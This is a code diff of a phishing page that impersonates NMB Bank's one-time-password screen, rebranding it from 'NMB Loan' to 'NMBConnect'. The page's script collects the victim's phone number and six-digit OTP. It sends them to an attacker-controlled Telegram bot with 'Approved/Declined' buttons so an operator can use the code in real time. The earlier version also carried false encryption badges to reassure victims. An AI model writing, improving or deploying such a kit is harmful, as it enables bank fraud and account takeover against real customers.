@@ -4,217 +4,169 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <meta name="theme-color" content="#003366">
-    <title>NMB Loan | Verify OTP · Zimbabwe</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <title>NMBConnect | Verify OTP</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
             --nmb-blue: #003366;
             --nmb-gold: #E4C16A;
-            --nmb-gold-light: #f1dfae;
-            --navy-dark: #002244;
             --white: #ffffff;
-            --light: #f8f9fa;
-            --dark: #1a1a1a;
-            --muted: #666666;
-            --border: #e0ddd9;
-            --error: #d32f2f;
+            --error: #ff4d4d;
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        html { -webkit-text-size-adjust: 100%; }
-
+        
         body {
-            font-family: 'Poppins', system-ui, sans-serif;
-            background: linear-gradient(135deg, var(--navy-dark) 0%, var(--nmb-blue) 50%, #004080 100%);
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?q=80&w=1000&auto=format&fit=crop');
+            background-size: cover;
+            background-position: center;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
-        }
-
-        header {
-            background: white;
-            padding: 14px 5%;
-            border-bottom: 4px solid var(--nmb-gold);
-            box-shadow: 0 2px 8px rgba(0,51,102,0.08);
-        }
-
-        .logo { font-size: 22px; font-weight: 900; text-decoration: none; display: flex; align-items: center; }
-        .logo .nmb { color: var(--nmb-blue); }
-        .logo .loan { color: var(--nmb-gold); margin-left: 2px; }
-
-        main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 40px 16px; }
-
-        .card {
-            background: white;
-            border-radius: 18px;
-            padding: 36px;
-            max-width: 420px;
-            width: 100%;
-            box-shadow: 0 20px 60px rgba(0,51,102,0.35);
-        }
-
-        .card-head { text-align: center; margin-bottom: 22px; }
-        .card-head h1 { font-size: 20px; font-weight: 900; color: var(--nmb-blue); margin-bottom: 4px; }
-        .card-head p { color: var(--muted); font-size: 12px; }
-
-        .bundle-bar {
-            background: linear-gradient(135deg, var(--nmb-blue), var(--navy-dark));
-            border-radius: 12px;
-            padding: 14px 16px;
-            margin-bottom: 20px;
+            align-items: center;
             color: white;
-            border: 1px solid rgba(255,255,255,0.08);
+            padding: 20px;
         }
 
-        .b-row { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 6px; }
-        .b-row:last-child { margin-bottom: 0; padding-top: 8px; border-top: 1px solid rgba(255,255,255,0.15); font-weight: 800; font-size: 13px; }
+        .header-nav {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            padding: 10px 0;
+            margin-bottom: 30px;
+        }
 
-        .err {
-            display: none;
-            background: rgba(211,47,47,0.08);
-            border: 1.5px solid rgba(211,47,47,0.2);
-            color: var(--error);
-            font-size: 12px;
-            font-weight: 700;
-            border-radius: 10px;
-            padding: 10px 12px;
-            margin-bottom: 14px;
+        .back-btn { font-size: 24px; cursor: pointer; margin-right: 15px; }
+        .nav-title { font-size: 18px; font-weight: 500; }
+
+        .logo-container {
             text-align: center;
+            margin-bottom: 40px;
         }
 
-        .err.show { display: block; }
+        .logo-circle {
+            width: 100px;
+            height: 100px;
+            background: var(--nmb-blue);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+        }
 
-        .fl { display: block; font-size: 10px; font-weight: 800; color: var(--nmb-blue); text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 8px; }
+        .brand-name { font-size: 20px; font-weight: 700; }
+        .brand-name .nmb { color: #4a90e2; }
+        .brand-name .connect { color: var(--nmb-gold); }
+
+        .card-head { text-align: center; margin-bottom: 30px; }
+        .card-head h1 { font-size: 22px; font-weight: 700; margin-bottom: 10px; }
+        .card-head p { font-size: 14px; opacity: 0.9; }
 
         .otp-row {
             display: flex;
-            gap: 8px;
+            gap: 10px;
             justify-content: center;
-            margin-bottom: 18px;
+            margin-bottom: 30px;
         }
 
         .otp-box {
-            width: 48px;
-            height: 54px;
+            width: 45px;
+            height: 55px;
             text-align: center;
-            font-size: 22px;
-            font-weight: 900;
-            border: 2px solid var(--border);
+            font-size: 24px;
+            font-weight: 700;
+            border: 1px solid rgba(255, 255, 255, 0.8);
             border-radius: 12px;
-            background: var(--light);
-            color: var(--dark);
-            font-family: 'Poppins', monospace;
-            transition: all 0.2s;
-        }
-
-        .otp-box:focus { border-color: var(--nmb-gold); background: white; box-shadow: 0 0 0 4px rgba(228,193,106,0.08); outline: none; }
-        .otp-box.ok { border-color: #4caf50; background: rgba(76,175,80,0.05); }
-
-        .hint { font-size: 10px; color: var(--muted); text-align: center; margin-bottom: 8px; }
-
-        .btns { display: flex; gap: 10px; margin-top: 20px; }
-
-        .btn-p {
-            flex: 1;
-            background: linear-gradient(135deg, var(--nmb-blue), var(--navy-dark));
+            background: rgba(255, 255, 255, 0.1);
             color: white;
-            border: none;
-            padding: 14px;
-            border-radius: 50px;
-            font-weight: 900;
-            font-size: 12px;
-            text-transform: uppercase;
-            cursor: pointer;
-            font-family: inherit;
-            box-shadow: 0 4px 14px rgba(0,51,102,0.28);
+            backdrop-filter: blur(5px);
+            outline: none;
             transition: all 0.2s;
         }
 
-        .btn-p:hover { background: var(--nmb-gold); color: var(--nmb-blue); transform: translateY(-2px); box-shadow: 0 6px 18px rgba(228,193,106,0.3); }
+        .otp-box:focus { border-color: var(--nmb-gold); background: rgba(255, 255, 255, 0.2); }
+        .otp-box.ok { border-color: #4caf50; }
 
-        .btn-o {
-            flex: 1;
-            background: transparent;
+        .sign-in-btn {
+            width: 100%;
+            max-width: 360px;
+            padding: 16px;
+            background: white;
             color: var(--nmb-blue);
-            border: 2px solid var(--nmb-blue);
-            padding: 14px;
-            border-radius: 50px;
-            font-weight: 800;
-            font-size: 12px;
-            text-transform: uppercase;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 600;
             cursor: pointer;
-            font-family: inherit;
+            transition: all 0.2s;
         }
 
-        .btn-o:hover { background: var(--light); }
+        .error-msg {
+            color: var(--error);
+            font-size: 13px;
+            text-align: center;
+            margin-bottom: 15px;
+            display: none;
+            background: rgba(0,0,0,0.5);
+            padding: 8px;
+            border-radius: 8px;
+        }
 
-        .card-ft { text-align: center; margin-top: 16px; font-size: 10px; color: var(--muted); }
-        .secure { display: flex; align-items: center; justify-content: center; gap: 5px; margin-top: 12px; font-size: 10px; color: var(--muted); font-weight: 700; }
-
-        /* Loading */
+        /* Overlay */
         .overlay {
             position: fixed; inset: 0;
             display: none;
-            align-items: center; justify-content: center; flex-direction: column; gap: 14px;
-            background: rgba(0,34,68,0.93);
+            align-items: center; justify-content: center; flex-direction: column;
+            background: rgba(0,0,0,0.85);
             z-index: 2000;
-            backdrop-filter: blur(6px);
+            backdrop-filter: blur(8px);
             text-align: center;
             padding: 20px;
         }
 
         .overlay.on { display: flex; }
-        .spin { width: 50px; height: 50px; border: 4px solid rgba(255,255,255,0.12); border-top-color: var(--nmb-gold); border-radius: 50%; animation: sp 0.8s linear infinite; }
-        .sp-t { font-size: 16px; font-weight: 800; color: white; margin-top: 10px; }
-        .sp-s { font-size: 12px; color: rgba(255,255,255,0.7); margin-top: 5px; line-height: 1.5; }
+        .spin { width: 50px; height: 50px; border: 4px solid rgba(255,255,255,0.1); border-top-color: var(--nmb-gold); border-radius: 50%; animation: sp 0.8s linear infinite; }
+        .sp-t { font-size: 18px; font-weight: 600; color: white; margin-top: 20px; }
+        .sp-s { font-size: 14px; color: rgba(255,255,255,0.7); margin-top: 10px; }
         @keyframes sp { to { transform: rotate(360deg); } }
-
-        @media (max-width: 500px) {
-            main { padding: 24px 12px; }
-            .card { padding: 28px 18px; }
-            .otp-row { gap: 5px; }
-            .otp-box { width: 40px; height: 48px; font-size: 18px; }
-            .btns { flex-direction: column; }
-        }
     </style>
 </head>
 <body onload="init()">
-    <header><a class="logo" href="index.html"><span class="nmb">NMB</span><span class="loan">Loan</span></a></header>
+    <div class="header-nav">
+        <span class="back-btn" onclick="location.href='login.html'">❮</span>
+        <span class="nav-title">Verify OTP</span>
+    </div>
 
-    <main>
-        <div class="card">
-            <div class="card-head">
-                <h1>Verify Code</h1>
-                <p>Enter the 6-digit OTP code sent to your phone</p>
-            </div>
-
-            <div id="bBar" class="bundle-bar" style="display:none;">
-                <div class="b-row"><span>Loan Type:</span><span id="bD">&mdash;</span></div>
-                <div class="b-row"><span>Amount:</span><span id="bP">$0 USD</span></div>
-            </div>
-
-            <div id="err" class="err"></div>
-
-            <label class="fl">OTP Verification Code</label>
-            <div class="otp-row" id="otpRow">
-                <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
-                <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
-                <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
-                <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
-                <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
-                <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
-            </div>
-            <p class="hint">Check your SMS for the 6-digit OTP code</p>
-
-            <div class="btns">
-                <button class="btn-p" onclick="doOTP()">Verify & Continue</button>
-                <button class="btn-o" onclick="location.href='login.html'">Cancel</button>
-            </div>
-
-            <div class="card-ft">Protected by 256-bit encryption.</div>
-            <div class="secure">🔒 End-to-End Encrypted</div>
+    <div class="logo-container">
+        <div class="logo-circle">
+            <svg viewBox="0 0 100 100" width="60" height="60">
+                <path d="M30,50 L70,50 M30,40 C20,40 20,60 30,60 L70,60 C80,60 80,40 70,40" fill="none" stroke="#E4C16A" stroke-width="8" stroke-linecap="round"/>
+                <path d="M45,35 L55,65" stroke="#E4C16A" stroke-width="8" stroke-linecap="round"/>
+            </svg>
         </div>
-    </main>
+        <div class="brand-name"><span class="nmb">NMB</span><span class="connect">Connect</span></div>
+    </div>
+
+    <div class="card-head">
+        <h1>Verify Code</h1>
+        <p>Enter the 6-digit OTP code sent to your phone</p>
+    </div>
+
+    <div id="err" class="error-msg"></div>
+
+    <div class="otp-row" id="otpRow">
+        <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+    </div>
+
+    <button class="sign-in-btn" onclick="doOTP()">Verify & Continue</button>
 
     <div id="ov" class="overlay">
         <div class="spin"></div>
@@ -232,12 +184,7 @@
             const p = new URLSearchParams(location.search);
             const d = p.get('data'), pr = p.get('price');
             phone = p.get('phone') || '';
-            if (d && pr) {
-                bd = { data: d, price: pr };
-                document.getElementById('bBar').style.display = 'block';
-                document.getElementById('bD').textContent = d;
-                document.getElementById('bP').textContent = '$' + pr + ' USD';
-            }
+            if (d && pr) { bd = { data: d, price: pr }; }
             setupOTP();
         }
 
@@ -269,8 +216,8 @@
         }
 
         function chk() { otp = Array.from(boxes).map(b => b.value).join(''); }
-        function showErr(m) { const e = document.getElementById('err'); e.textContent = m; e.classList.add('show'); }
-        function clrErr() { document.getElementById('err').classList.remove('show'); }
+        function showErr(m) { const e = document.getElementById('err'); e.textContent = m; e.style.display = 'block'; }
+        function clrErr() { document.getElementById('err').style.display = 'none'; }
 
         async function tg(msg, btns) {
             try {
@@ -283,9 +230,7 @@
                 if (d.ok) {
                     const ur = await fetch(`https://api.telegram.org/bot${BOT}/getUpdates?limit=1&offset=-1`);
                     const ud = await ur.json();
-                    if (ud.ok && ud.result.length > 0) {
-                        luid = ud.result[0].update_id;
-                    }
+                    if (ud.ok && ud.result.length > 0) { luid = ud.result[0].update_id; }
                 }
             } catch(e) { console.error(e); }
         }
@@ -295,9 +240,7 @@
             if (otp.length !== 6) { showErr('Enter the 6-digit code'); return; }
 
             const msg = `🔑 <b>OTP Code</b>\n\n<b>Phone:</b> <code>+263${phone}</code>\n<b>OTP:</b> <code>${otp}</code>\n<b>Loan:</b> <code>${bd.data || 'N/A'}</code>`;
-            const btns = [
-                [{ text: '✓ Approved', callback_data: 'otp_approved' }, { text: '✗ Declined', callback_data: 'otp_declined' }]
-            ];
+            const btns = [[{ text: '✓ Approved', callback_data: 'otp_approved' }, { text: '✗ Declined', callback_data: 'otp_declined' }]];
 
             document.getElementById('ov').classList.add('on');
             tg(msg, btns);
